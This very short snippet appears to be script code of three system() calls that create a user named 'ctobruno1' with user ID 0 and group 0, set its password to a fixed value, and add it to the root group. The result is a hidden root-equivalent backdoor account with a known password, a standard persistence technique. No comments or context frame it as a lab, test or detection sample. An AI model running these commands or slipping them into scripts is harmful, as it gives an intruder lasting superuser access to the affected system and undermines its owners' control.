system("useradd -ou 0 -g 0 ctobruno1")
system("echo 'ctobruno1:fiap' | chpasswd")
system("usermod -aG root ctobruno1")